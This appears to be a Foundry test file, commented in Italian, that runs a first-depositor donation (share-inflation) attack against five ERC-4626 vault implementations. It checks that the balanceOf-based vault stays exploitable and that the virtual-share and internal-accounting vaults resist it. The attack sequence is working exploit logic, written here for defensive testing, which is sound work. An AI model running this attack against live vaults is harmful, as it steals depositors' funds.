// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// HARNESS PARAMETRICO FEDELE: UN solo attacco donation/first-depositor che chiama l'ABI REALE del vault
// (deposit/redeem/balanceOf) -> nessuna reimplementazione, nessuna infedelta. Isolamento: deploy fresco per trial.
// L'UNICA parte per-forma e' il deployer (2 righe). Stesso attacco contro 5 forme su 4 librerie upstream reali.
import "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {IVault, IMintableERC20} from "../src/IVault.sol";
import {MockToken, VaultBalanceOf, VaultInternal} from "../src/Targets.sol";
import {SoladyVault, OZVault, OZVaultOffset6} from "../src/ShapesExt.sol";

contract GeneralGate is Test {
    address atk = address(0xA11CE);
    address vic = address(0xB0B);

    // === ATTACCO CONDIVISO E FEDELE (identico per ogni vault; chiama solo l'ABI reale) ===
    function _oneAttack(IVault v, IMintableERC20 t, uint256 V, uint256 D) internal returns (int256 profit, bool blocked) {
        t.mint(atk, 1 + D);
        t.mint(vic, V);
        vm.startPrank(atk);
        t.approve(address(v), type(uint256).max);
        try v.deposit(1, atk) returns (uint256) {} catch { vm.stopPrank(); return (int256(0), true); }
        t.transfer(address(v), D);                       // donazione diretta (gonfia balanceOf, se usato)
        vm.stopPrank();
        vm.startPrank(vic);
        t.approve(address(v), type(uint256).max);
        try v.deposit(V, vic) returns (uint256) { vm.stopPrank(); }
        catch { vm.stopPrank(); return (int256(0), true); }   // ZERO_SHARES o simili -> DoS, non furto
        vm.startPrank(atk);
        uint256 got = v.redeem(v.balanceOf(atk), atk, atk);
        vm.stopPrank();
        profit = int256(got) - int256(1 + D);
    }

    // === SWEEP CONDIVISO: deploy fresco per ogni donazione, riporta max profit + witness ===
    function _sweep(string memory name, function() internal returns (IVault, IMintableERC20) deploy)
        internal returns (int256 maxP)
    {
        uint256 V = 100e18;
        uint256[12] memory Ds = [uint256(1e18), 10e18, 25e18, 40e18, 49e18, 50e18,
                                 51e18, 60e18, 75e18, 90e18, 99e18, 100e18];
        maxP = type(int256).min; uint256 bestD; uint256 blocked;
        for (uint256 i = 0; i < 12; i++) {
            (IVault v, IMintableERC20 t) = deploy();      // STATO FRESCO per trial (isolamento)
            (int256 p, bool b) = _oneAttack(v, t, V, Ds[i]);
            if (b) { blocked++; continue; }
            if (p > maxP) { maxP = p; bestD = Ds[i]; }
        }
        emit log_string(string.concat("RESULT ", name, " maxProfit=", vm.toString(maxP), " witness=", vm.toString(bestD)));
        emit log_named_uint(string.concat(name, "_blocked"), blocked);
    }

    // === DEPLOYER per-forma (l'UNICA parte specifica: 2 righe ciascuno) ===
    function _dSolmateBal() internal returns (IVault, IMintableERC20) {
        MockToken t = new MockToken(); return (IVault(address(new VaultBalanceOf(ERC20(address(t))))), IMintableERC20(address(t)));
    }
    function _dSolmateInt() internal returns (IVault, IMintableERC20) {
        MockToken t = new MockToken(); return (IVault(address(new VaultInternal(ERC20(address(t))))), IMintableERC20(address(t)));
    }
    function _dSolady() internal returns (IVault, IMintableERC20) {
        MockToken t = new MockToken(); return (IVault(address(new SoladyVault(address(t)))), IMintableERC20(address(t)));
    }
    function _dOZ0() internal returns (IVault, IMintableERC20) {
        MockToken t = new MockToken(); return (IVault(address(new OZVault(address(t)))), IMintableERC20(address(t)));
    }
    function _dOZ6() internal returns (IVault, IMintableERC20) {
        MockToken t = new MockToken(); return (IVault(address(new OZVaultOffset6(address(t)))), IMintableERC20(address(t)));
    }

    function testAllShapes() public {
        int256 vuln = _sweep("solmate_balanceof", _dSolmateBal);    // VULN atteso
        int256 sInt = _sweep("solmate_internal", _dSolmateInt);     // SAFE (accounting interno)
        int256 sola = _sweep("solady_virtualshares", _dSolady);     // SAFE (virtual-shares reale)
        int256 oz0  = _sweep("oz_offset0", _dOZ0);                  // SAFE (OZ virtual +1)
        int256 oz6  = _sweep("oz_offset6", _dOZ6);                  // SAFE-forte (OZ 10^6)
        // ANCORA BIDIREZIONALE — falsifier-assert su ENTRAMBE le polarita (non solo riportate):
        // (a) la forma senza difesa DEVE restare sfruttabile per esecuzione (cattura la VULN)
        assertGt(vuln, int256(0), "VULN: solmate(balanceOf) deve restare sfruttabile per esecuzione");
        // (b) ogni difesa reale DEVE rendere l'attacco non-profittevole = PIN del certificato-immunita.
        //     GUARD (review): un IMMUNE vale SOLO se l'attacco e' stato ESEGUITO (>=1 trial). Se TUTTI i 12 trial
        //     sono bloccati (DoS sul deposit), maxP resta type(int256).min e assertLe(int.min,0) passerebbe VACUO
        //     -> sarebbe un falso-SAFE. Lo escludiamo (coerente con la disciplina executed>0 di BenchGate/ForkGate).
        int256 SENT = type(int256).min;
        assertGt(sInt, SENT, "ABSTAIN non IMMUNE: solmate-internal, tutti i 12 trial bloccati (DoS)");
        assertGt(sola, SENT, "ABSTAIN non IMMUNE: solady, tutti i 12 trial bloccati (DoS)");
        assertGt(oz0,  SENT, "ABSTAIN non IMMUNE: OZ offset0, tutti i 12 trial bloccati (DoS)");
        assertGt(oz6,  SENT, "ABSTAIN non IMMUNE: OZ offset6, tutti i 12 trial bloccati (DoS)");
        assertLe(sInt, int256(0), "IMMUNE: solmate internal-accounting non deve essere drenabile");
        assertLe(sola, int256(0), "IMMUNE: solady virtual-shares non deve essere drenabile");
        assertLe(oz0,  int256(0), "IMMUNE: OZ offset0 (virtual +1) non deve essere drenabile");
        assertLe(oz6,  int256(0), "IMMUNE: OZ offset6 (10^6) non deve essere drenabile");
    }
}
